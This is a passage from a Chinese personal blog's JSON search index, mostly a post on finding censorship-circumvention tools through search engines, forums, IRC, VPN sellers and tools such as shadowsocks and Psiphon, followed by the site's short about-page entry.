color=\"yellow\">搜索引擎是最便捷的,记得用不同的搜索引擎</font><br>然后呢,社区，QQ，贴吧提问，IRC</p>\n<p>估计小众社区还好一点，要不然估计<br>立马被封，那么该怎么办呢</p>\n<p><strong>不仅要找到有资源的地方，还要找到要愿意给你资源的人</strong></p>\n<font color=\"blue\"> 翻墙的平台，Windows，Linux，手机还是浏览器（原谅我把这个单独列出来）</font>\n\n<p>如果人家不愿意分享给你，你又要怎么办呢？<br>想要得到东西，估计是要付出代价的。世上哪有免费的午餐呢对吧<br>这时候，你想到了<font color=\"red\">购买</font>，或者你最开始就想到了购买，你打开淘宝，<br>京东，等等。搜翻墙，哦不，这是被禁的了，那搜<strong>VPN</strong>，VPN关键字在一段<br>时间后也被禁了。搜<strong>港台空间</strong>，代理等等，不出时日，又被禁了。</p>\n<p>现在，我们还是还是想要买，怎么办呢。点开淘宝，给店主交流交流。<br>大家都是老司机，黑爵士（恰好再看闻香识女人），两句话一说，便知道要干什么，<br>或者你是一个彻头彻尾的菜鸟，但是你强烈的渴望，以及愿意付出金钱，<br>还是可以买到。</p>\n<font color=\"red\">当然，买到并不是唯一的目的。</font>\n\n<p>你可是要成为技术大牛的人，而且这世上还有那么多愿意提供免费服务的<br>人存在（不良目的的除外），这些为了互联网的自由精神，作为斗士而言<br>，他们的存在为我们带了极大的方便。<br>现在，谷歌搜索一下，哦，还没有翻墙，用不了怎么办呢。<br>那么打开百度搜索，搜翻墙，虽然关键字涉嫌XX，但还是出来了一大堆，可是呢，<br>广告很多，而且其中还有骗子，当然靠谱的还是有的。但是那些靠谱的没过多久就<br>被请喝了茶。那怎么办呢，让我们换个思路，搜一搜翻墙列表，类似于指南的东西</p>\n<p>而有wiki这么好的东西，何不试着搜索下 <strong>翻墙wiki</strong>， 估计你会得到维基百科的<strong>翻墙列表</strong><br>然后选一个呗</p>\n<font color=\"red\"><br>其他例如：github上有很多维护翻墙的，stackoverflow上也可以提问啊，quora，知乎等等。<br>当然直接换换搜索引擎，yandex，Yahoo，bing。这是一个过程，不是学习的过程，而是学会如何学习的<br>过程。<br></font>\n\n<p>现在再想一下，有<strong>哪些人</strong>愿意提供， <strong>为了什么</strong>, 为了自由的，为了制造自由的，为了赚钱的，还有<br>为了反共的，当然还有一部分为了技术的。然后你现在也得到了可供翻墙的工具和列表，<br>So，试试呗。</p>\n<p>还有些方法：问问前辈啊，以及很多网站会<font color=\"red\">提供发送到某某邮箱</font>，然后会收到自动回复的<br>最新地址，假如，我想翻，我没资源，怎么办呢。试试吧，发送任意内容到fanqiang@gmail.com<br>当然，这是一个假设。甚至根本么有这个email，但是你可以尝试一下，只要一下下，想想<br>有哪些关键字，发送到可尝试的邮箱。或者先用搜索引擎试着筛选出一些你可能需要mail地址。然后尝试<br>发送一下。<br>热心的人很多，IRC里面总有愿意帮助你的，可以一试啊。毕竟大牛那么多，他们手里握的<br>资源那么多。</p>\n<h2 id=\"翻墙后：\"><a href=\"#翻墙后：\" class=\"headerlink\" title=\"翻墙后：\"></a>翻墙后：</h2><p>好吧，现在我已经翻出来了。总要看看新的世界。但是别忘了，第一件事就是应该<font color=\"red\">保持一个状态</font><br>，留有后路，如果你掌握了方法，其实已经不需要了。<br>至少拥有两到三种后备的翻墙方式。加入Google Group讨论群组，加入Facebook翻墙列表。<br>当然，在你翻过来之前，你就应该看看那些没被墙的，又充满技术和自由氛围的网站。</p>\n<p>最后，其实说了这么多，也许翻墙方式并不是太完整。但是相信通过这个简单的教程，<br>应该已经思索到什么东西了吧。<br>最后，无论如何，无论是翻墙还是互联网，这些东西都是为人来服务。</p>\n<h2 id=\"补充：\"><a href=\"#补充：\" class=\"headerlink\" title=\"补充：\"></a>补充：</h2><p>goagent是我最早用的，后来筑波大学的VPN，买过红杏的vpn，也用过免费的shadowsocks，<br>还有自由门，无界，赛风等。当然还有集成浏览器，不得不说这个最方便。哦，修改host也是<br>不错的方法。如果不差钱，买个vps自己搭一个是个更好的选择。<br>我都说了这么多，还不会翻的话，简直无药可救了。</p>\n<h4 id=\"整理整理思路，把以前写的东西看看有没有用，沉淀一下。\"><a href=\"#整理整理思路，把以前写的东西看看有没有用，沉淀一下。\" class=\"headerlink\" title=\"整理整理思路，把以前写的东西看看有没有用，沉淀一下。\"></a>整理整理思路，把以前写的东西看看有没有用，沉淀一下。</h4>","categories":["HowTo"],"tags":["小手段"]},{"title":"关于","url":"http://iami.xyz/about/index.html","content":"<ul>\n<li>追求幸福和自由</li>\n<li>希望自己的一生活的精彩，精神世界须如是</li>\n<li><del>在读学生</del>，技术粉，爱折腾，爱生活，爱读书</li>\n<li>慎独ing</li>\n</ul>\n","categories":[],"tags":[]},{"title":"category","url":"http://iami.xyz/category/index.html","content":"","categories":[],"tags":[]},{"title":"project","url":"http://iami.xyz/project/index.html","content":"","categories":[],"tags":[]},{"title":"search","url":"http://iami.xyz/search/index.html","content":"","categories":[],"tags":[]},{"title":"tag","url":"http://iami.xyz/tag/index.html","content":"","categories":[],"tags":[]}]